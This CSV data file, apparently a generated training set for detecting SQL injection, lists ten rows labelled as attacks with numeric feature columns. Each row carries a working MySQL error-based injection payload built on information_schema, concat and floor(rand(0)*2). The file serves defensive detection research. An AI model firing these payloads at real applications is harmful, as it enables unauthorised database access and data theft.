id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000001,attack,error,"1',  (  select 6825 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6825  =  6825,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",nearest_attack_euclidean,R000028,5.709072894653851,297.07757568359375,97.07865142822266,42.663063049316406,108.0378646850586,14.247493743896484,95.97771453857422,35.057861328125,0.7980960011482239,0.35726895928382874,0.15969964861869812,0.35657215118408203,0.14104357361793518,3.869715690612793,2.5029184818267822,0.7411556839942932,0.32630863785743713,0.21679678559303284,-0.9219774603843689,-0.6078575253486633,8.415712356567383,10.571425437927246,3.663677453994751,0.17622534930706024,1.4939416646957397,0.338685005903244,-0.8389039039611816,0.7400804162025452,0.12923215329647064,0.5237388610839844,0.43890976905822754,-0.07410290092229843,1.3645246028900146,0.36957284808158875,0.17341507971286774,2.1952626705169678,7.557479381561279,1.1837794780731201,2.3245179653167725,0.37997350096702576,0.5449526906013489,1.3041267395019531,-0.029509412124753,-0.04385845363140106,-0.47397559881210327,0.42314162850379944,0.5857925415039062,0.5048929452896118,0.32713788747787476,0.18890641629695892,0.5540805459022522,0.33541956543922424,-0.015309404581785202,-0.41830897331237793,0.686907947063446,0.15234847366809845,0.5274743437767029,0.1055532693862915,0.5287376046180725,-0.21956869959831238,-0.16461755335330963,0.3553362488746643,-0.008736614137887955,-0.24155235290527344,0.17205512523651123,-0.45897457003593445,0.608618974685669,0.07937046140432358,0.5961139798164368,0.1972656399011612,-0.12139037251472473,0.6550354957580566,0.20701152086257935,0.04498947039246559,0.4605778753757477,0.15077003836631775,0.30837753415107727,0.22477154433727264,-0.23089346289634705,0.08577442914247513,0.7412973642349243,11.491007804870605,0.48401546478271484,0.26610416173934937,0.05493110045790672,0.997575044631958,-0.15573659539222717,0.2772901952266693,0.015327263623476028
GAN_000002,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000006,5.8153915379514,285.82867431640625,90.5244369506836,45.29582595825195,110.38948059082031,11.521594047546387,87.2182388305664,37.40456771850586,0.912420928478241,0.3498890697956085,0.15325455367565155,0.3774525821208954,0.1380782425403595,3.82610821723938,2.2732861042022705,0.93707674741745,0.5090445876121521,0.23540465533733368,-0.5874226689338684,-0.32646816968917847,9.658404350280762,11.178207397460938,3.4247817993164062,0.2160123735666275,1.6370402574539185,0.26288124918937683,-0.40994277596473694,0.4584047198295593,0.20607370138168335,0.7606748938560486,0.3129185140132904,-0.10035478323698044,1.3792589902877808,0.0029907114803791046,0.23296941816806793,2.3453097343444824,7.917295455932617,1.0783942937850952,2.574828624725342,0.5643348097801208,0.4894908666610718,1.0730055570602417,-0.018735814839601517,-0.018803121522068977,-0.1216946616768837,0.028539162129163742,0.304811954498291,0.45669010281562805,0.3643931448459625,0.3756334185600281,0.4733113646507263,0.5187246203422546,-0.11280202865600586,-0.2206851840019226,0.5762971043586731,0.13895957171916962,0.31370022892951965,0.3242286443710327,0.3511546850204468,-0.1585809886455536,-0.24377869069576263,0.3310256898403168,-0.16322408616542816,-0.104775071144104,0.2196442037820816,-0.10768447816371918,0.556178867816925,-0.12979906797409058,0.2237541228532791,0.13914982974529266,-0.033060017973184586,0.38118109107017517,0.08906960487365723,-0.003871150314807892,0.4121657907962799,0.29568201303482056,0.44413015246391296,0.34424084424972534,-0.10841159522533417,0.07197366654872894,0.6156493425369263,11.026764869689941,0.5799123048782349,0.23650206625461578,0.07920991629362106,0.8687855005264282,-0.12142917513847351,-0.014896892942488194,-0.012043274939060211
GAN_000003,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000006,5.900475518899435,293.7450256347656,95.64599609375,41.16302490234375,111.18553161621094,22.04866600036621,94.88506317138672,34.93225860595703,1.0767203569412231,0.37532946467399597,0.15075252950191498,0.3691174387931824,0.14247280359268188,3.821396827697754,2.1708788871765137,0.5299539566040039,0.701879620552063,0.24881701171398163,-0.7840676307678223,-0.2991916239261627,8.751226425170898,11.799768447875977,3.4421005249023438,-0.05682217702269554,1.6278048753738403,0.3241920471191406,-0.7530683279037476,0.3543103039264679,0.09920081496238708,0.4603055417537689,0.70899498462677,-0.558256208896637,1.4945656061172485,0.12886874377727509,0.09433198720216751,2.1088976860046387,8.377580642700195,1.1201096773147583,2.4842617511749268,0.8117342591285706,0.6206331253051758,1.3043915033340454,0.0255703367292881,-0.02559518627822399,-0.08954937756061554,0.08515899628400803,0.2381160408258438,0.5051373839378357,0.19497190415859222,0.26917600631713867,0.4465840756893158,0.3873611390590668,-0.21209664642810822,-0.40483129024505615,0.6398758292198181,0.05817421153187752,0.49574458599090576,0.20811593532562256,0.415188193321228,-0.566422700881958,-0.23224468529224396,0.38833606243133545,0.13376185297966003,-0.28420552611351013,0.12117128074169159,-0.40192875266075134,0.6617439985275269,-0.26666978001594543,0.2205275148153305,0.32617995142936707,-0.060028575360774994,0.6022149324417114,0.11107020825147629,-0.09603509306907654,0.6244784593582153,0.30752599239349365,0.28415992856025696,0.2541562616825104,-0.32621946930885315,0.014374758116900921,0.6464017033576965,12.406174659729004,0.5648289918899536,0.28135406970977783,0.07541531324386597,0.8575981855392456,0.32636329531669617,0.3615071475505829,-0.19029706716537476
GAN_000004,attack,error,"1',  (  select 6825 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6825  =  6825,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",nearest_attack_euclidean,R000028,5.596838445391306,286.1802978515625,93.3251953125,41.70802688598633,106.1276626586914,11.739472389221191,93.84952545166016,35.11505889892578,1.067014455795288,0.3569117486476898,0.15704074501991272,0.3718920350074768,0.14212855696678162,3.797682762145996,2.0847795009613037,0.6002436876296997,0.307611882686615,0.1777542233467102,-0.9080280661582947,-0.34404054284095764,8.90478229522705,9.953977584838867,3.93192982673645,0.1281696856021881,1.5625625848770142,0.24808357656002045,-0.6903737783432007,0.5071375370025635,0.1394677311182022,0.5840326547622681,0.3938077688217163,0.04950740560889244,1.5454397201538086,0.13618983328342438,0.14197216928005219,2.205517053604126,7.179072380065918,1.3500983715057373,2.3395395278930664,0.5628810524940491,0.5679152607917786,1.2548524141311646,-0.22062312066555023,-0.02799222432076931,-0.4156574010848999,0.3111235499382019,0.6658927798271179,0.3957717716693878,0.3147595524787903,0.2381468564271927,0.496048241853714,0.34357449412345886,-0.1559324711561203,-0.2600489556789398,0.5610154867172241,0.1367335468530655,0.3722788393497467,0.3448489308357239,0.3927490711212158,-0.09528706967830658,-0.14752162992954254,0.2279035449028015,-0.023229025304317474,-0.21178129315376282,0.04299437254667282,-0.27920663356781006,0.5649989247322083,-0.029657501727342606,0.4502631425857544,0.12620890140533447,-0.16623851656913757,0.49607402086257935,0.1256040632724762,-0.03535718843340874,0.5486730933189392,0.26390519738197327,0.1674615442752838,0.2974129915237427,-0.15497149527072906,0.07903310656547546,0.7519965171813965,11.576310157775879,0.5232585668563843,0.22226598858833313,0.11732589453458786,0.9810281991958618,-0.2940642833709717,-0.06462518125772476,-0.22978070378303528
GAN_000005,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000006,5.751159743680741,290.6700744628906,90.14884185791016,40.79143524169922,104.9934310913086,14.185199737548828,88.48812866210938,35.77269744873047,1.1160060167312622,0.3605460226535797,0.14446645975112915,0.3789084553718567,0.1349279135465622,3.8084583282470703,1.9905935525894165,0.7273246645927429,0.4221063554286957,0.28680139780044556,-0.5319083333015442,-0.24180720746517181,9.28104305267334,11.383670806884766,3.5859785079956055,0.06076331436634064,1.8566099405288696,0.3061950206756592,-0.3681384325027466,0.33034011721611023,0.1837465465068817,0.7966864109039307,0.2997354567050934,-0.022227199748158455,1.4327772855758667,-0.07542215287685394,0.230040043592453,2.142953872680664,7.817838668823242,1.0893040895462036,2.547196626663208,0.5060216784477234,0.6060624718666077,0.9766013026237488,0.059338025748729706,0.02237691543996334,-0.09364020824432373,0.11972108483314514,0.39624911546707153,0.42271050810813904,0.34645748138427734,0.3985406756401062,0.45111533999443054,0.4561172425746918,-0.11292311549186707,-0.054973963648080826,0.5902941226959229,0.1410880833864212,0.28243836760520935,0.0009560249745845795,0.361558735370636,-0.424395352602005,-0.35369813442230225,0.2891474664211273,-0.13355900347232819,-0.18334165215492249,0.029711324721574783,-0.24329881370067596,0.5925576090812683,-0.1318512260913849,0.27175194025039673,-0.04688050597906113,-0.18748833239078522,0.24984689056873322,0.32375621795654297,-0.11528308689594269,0.35917967557907104,0.17854619026184082,0.38068458437919617,0.2499953806400299,-0.16433675587177277,0.05577082186937332,0.6243348717689514,11.425516128540039,0.6299281716346741,0.23791788518428802,0.09320273995399475,0.9422926902770996,-0.06243745982646942,0.121410071849823,-0.08305732160806656
GAN_000006,attack,error,"1',  (  select 6825 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6825  =  6825,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",nearest_attack_euclidean,R000028,5.631717423471213,303.9523010253906,99.68226623535156,40.04151916503906,105.08817291259766,15.799656867980957,100.60960388183594,33.06315612792969,1.1016435623168945,0.3874095678329468,0.150774285197258,0.36034396290779114,0.14039967954158783,3.8006134033203125,2.080181360244751,0.3251466453075409,0.5388814210891724,0.15418413281440735,-0.9980871677398682,-0.1462646871805191,8.88372802734375,10.798056602478027,4.205387115478516,-0.022344965487718582,1.7492892742156982,0.17528459429740906,-0.7703794240951538,0.3084409534931183,0.07931286096572876,0.6449873447418213,0.5484264492988586,-0.389325350522995,1.5703859329223633,0.4438747763633728,0.10521838814020157,2.091426134109497,8.219317436218262,1.4283788204193115,2.1400794982910156,0.6038967967033386,0.6366389393806458,1.2314221858978271,-0.26179760694503784,-0.018879791721701622,-0.31487882137298584,0.4351978600025177,0.5501523017883301,0.35898977518081665,0.3484414219856262,0.15549348294734955,0.5782490372657776,0.3326389789581299,-0.10332389175891876,-0.15926587581634521,0.7003294229507446,0.032730523496866226,0.39770591259002686,0.021483901888132095,0.5648408532142639,-0.451561838388443,-0.3430987000465393,0.11454460024833679,0.06987668573856354,-0.31245172023773193,-0.007217906415462494,-0.08719674497842789,0.6896319389343262,-0.07864265143871307,0.4239729046821594,0.3834441304206848,-0.2994827330112457,0.5998567342758179,0.19862337410449982,-0.14900119602680206,0.5590989589691162,0.09012328088283539,0.08209910988807678,0.15419529378414154,-0.2078188955783844,0.03564311936497688,0.7432841062545776,12.09961986541748,0.41672906279563904,0.2623671293258667,0.10617624968290329,0.9037478566169739,-0.11471794545650482,0.20858602225780487,-0.4671880900859833
GAN_000007,attack,error,"1',  (  select 6825 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6825  =  6825,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",nearest_attack_euclidean,R000028,5.884838703710227,287.64013671875,90.20309448242188,39.47458267211914,108.80598449707031,14.705204963684082,84.90830993652344,35.75897979736328,0.9236845374107361,0.35360148549079895,0.1474447250366211,0.37473753094673157,0.13764095306396484,3.808272123336792,2.081576108932495,0.8523818850517273,0.47582098841667175,0.3057650029659271,-0.7009543776512146,-0.31803378462791443,9.18022632598877,11.777227401733398,2.9344747066497803,0.05516120418906212,1.779708743095398,0.3084842562675476,-0.4341350793838501,0.5015860199928284,0.19071827828884125,0.6963011622428894,0.5610408782958984,-0.23281614482402802,1.429134488105774,-0.08028186112642288,0.19940230250358582,2.154766798019409,8.110276222229004,1.02739679813385,2.729442596435547,0.647589385509491,0.5729357004165649,1.0806236267089844,-0.023964768275618553,-0.020626714453101158,-0.14922022819519043,0.0504186786711216,0.1933872401714325,0.47866663336753845,0.33976295590400696,0.45132002234458923,0.4461711645126343,0.49614161252975464,-0.23759709298610687,-0.20540215075016022,0.6170591711997986,0.1196352168917656,0.38797616958618164,0.20407786965370178,0.28531911969184875,-0.5613577961921692,-0.22642011940479279,0.48738691210746765,0.06589844822883606,-0.18663501739501953,-0.08353550732135773,-0.5167247653007507,0.6330999732017517,-0.3166544735431671,0.06901244819164276,0.07952865213155746,-0.09899232536554337,0.45941850543022156,0.376127153635025,-0.1304948925971985,0.555223822593689,0.2652965188026428,0.34937068819999695,0.287573903799057,-0.29920831322669983,0.06056815758347511,0.6811622977256775,11.463542938232422,0.5421240329742432,0.26645442843437195,0.06669802963733673,0.9107242226600647,-0.02547590062022209,0.17659209668636322,-0.25325924158096313
GAN_000008,attack,error,"1',  (  select 6825 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6825  =  6825,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",nearest_attack_euclidean,R000028,5.830134296706071,297.80804443359375,94.44698333740234,42.83660125732422,113.6948471069336,15.104277610778809,90.1373062133789,36.9970703125,0.8336505889892578,0.34827324748039246,0.14838221669197083,0.36900216341018677,0.1354241520166397,3.840538263320923,2.513651132583618,0.6966771483421326,0.5124098062515259,0.25380581617355347,-0.5245555639266968,-0.32057443261146545,9.042616844177246,12.023702621459961,3.3610572814941406,0.11324368417263031,1.7578154802322388,0.3025664687156677,-0.6571148633956909,0.553325355052948,0.11956684291362762,0.7445187568664551,0.5721793174743652,-0.2395508736371994,1.2684290409088135,0.1625707745552063,0.2803448736667633,1.992353916168213,8.261528015136719,0.897487461566925,2.666435718536377,0.7289139628410339,0.46702998876571655,1.1272426843643188,0.13812077045440674,-0.03828415274620056,-0.18508747220039368,0.2199355959892273,-0.023666951805353165,0.6180779933929443,0.30602166056632996,0.37722307443618774,0.516435444355011,0.4795403480529785,-0.0686449334025383,-0.38027194142341614,0.6296078562736511,0.15222592651844025,0.47554221749305725,0.1410200595855713,0.3815401494503021,-0.3918851315975189,-0.28105631470680237,0.4740116000175476,0.09442831575870514,-0.4548007845878601,0.12833178043365479,-0.6936454772949219,0.5812433958053589,-0.1413843184709549,0.17567557096481323,0.20397010445594788,-0.003644971176981926,0.6115760207176208,0.3426356017589569,-0.06473350524902344,0.46924442052841187,0.2519810199737549,0.4062495827674866,0.2264665961265564,-0.17234934866428375,0.04815051704645157,0.7335692048072815,11.310664176940918,0.5640241503715515,0.28470027446746826,0.020615655928850174,0.9073837995529175,0.08603658527135849,0.3833429515361786,0.013189569115638733
GAN_000009,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000006,5.510113298187757,286.8638916015625,91.54611206054688,41.67903137207031,109.28028106689453,12.445354461669922,90.1718978881836,35.133792877197266,0.9301388263702393,0.3547877371311188,0.15316562354564667,0.38241225481033325,0.1379874348640442,3.8294217586517334,2.0608701705932617,0.7989049553871155,0.45475730299949646,0.23905320465564728,-0.552437961101532,-0.1034577488899231,9.376930236816406,10.994013786315918,3.7210609912872314,0.18568024039268494,1.642547607421875,0.2394545078277588,-0.4735054075717926,0.3181813955307007,0.14528292417526245,0.7158564329147339,0.29082947969436646,-0.008066229522228241,1.4444620609283447,0.028754375874996185,0.17385299503803253,2.1664795875549316,7.833977699279785,1.1126827001571655,2.409703254699707,0.469655841588974,0.5218106508255005,1.132887601852417,-0.06574325263500214,-0.006668752990663052,-0.16133083403110504,0.0894731730222702,0.439850777387619,0.43302276730537415,0.3303124010562897,0.36126968264579773,0.47653862833976746,0.3911406397819519,-0.21492591500282288,-0.1596914827823639,0.5861872434616089,0.14158043265342712,0.36432594060897827,0.11581452190876007,0.3392234742641449,-0.1795548051595688,-0.24445708096027374,0.2545463442802429,-0.06045765429735184,-0.060460083186626434,0.26406222581863403,-0.15621905028820038,0.6311007738113403,-0.021319475024938583,0.1915132999420166,0.07332812249660492,-0.12943539023399353,0.3788609802722931,0.10425522923469543,-0.025610443204641342,0.3792605996131897,0.24159720540046692,0.4763774275779724,0.365369588136673,-0.056068092584609985,0.02829449251294136,0.6040249466896057,11.39671802520752,0.6492201685905457,0.2322438657283783,0.09592456370592117,0.8827375769615173,-0.04781397804617882,0.10555581748485565,-0.07371396571397781
GAN_000010,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000006,5.890370219740017,303.56884765625,90.84547424316406,40.888431549072266,110.18778991699219,20.168609619140625,86.05970764160156,33.58341979980469,1.044321060180664,0.3541814982891083,0.1569153368473053,0.3643362820148468,0.14499805867671967,3.8528287410736084,1.962807536125183,0.7160196304321289,0.5301161408424377,0.3534504771232605,-0.709912896156311,-0.4547363519668579,7.995000839233398,11.351590156555176,3.5088002681732178,0.008781421929597855,1.6937856674194336,0.33662086725234985,-0.4629800021648407,0.3460840880870819,0.17329971492290497,0.7587410807609558,0.6748890280723572,-0.1629847288131714,1.463620662689209,0.07032457739114761,0.17262305319309235,2.1212775707244873,7.921918869018555,1.098534345626831,2.783177375793457,0.5068039298057556,0.6389589905738831,1.1317551136016846,0.02459205500781536,-0.004343724809587002,-0.03852366283535957,0.26709413528442383,0.43685412406921387,0.520053505897522,0.29563701152801514,0.3568076491355896,0.46391215920448303,0.3729111850261688,-0.17762887477874756,-0.07999926060438156,0.654367983341217,0.05130729451775551,0.449068546295166,-0.2045375108718872,0.4521767795085907,-0.6831452250480652,-0.36670729517936707,0.573616623878479,0.09715692698955536,-0.26420339941978455,0.14350625872612,-0.3680001199245453,0.653579831123352,-0.20377109944820404,0.22185015678405762,0.06939101219177246,-0.13037490844726562,0.5258820056915283,0.03216947615146637,-0.20328016579151154,0.6401209831237793,0.13017071783542633,0.450143426656723,0.3140459656715393,-0.3020017147064209,0.04547668248414993,0.6400916576385498,11.570371627807617,0.6323258280754089,0.2762283384799957,0.0791715681552887,0.8595966100692749,0.30063605308532715,0.2642238736152649,-0.2359773814678192
